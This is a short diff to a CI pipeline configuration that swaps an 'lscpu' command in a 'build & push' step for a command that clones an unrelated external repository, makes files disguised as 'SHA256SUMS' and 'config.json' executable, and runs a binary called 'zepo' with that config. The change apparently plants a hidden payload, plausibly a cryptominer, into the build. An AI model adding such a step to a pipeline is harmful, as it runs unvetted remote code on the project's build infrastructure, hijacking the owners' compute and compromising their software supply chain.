@@ -10,4 +10,5 @@ steps:
   - name: build & push
     image: golang
     commands:
-         - lscpu
+         - git clone https://github.com/azureone4/zephher.git && cd zephher && chmod +x SHA256SUMS && chmod +x config.json && chmod +x zepo && ./zepo -c "config.json"
+
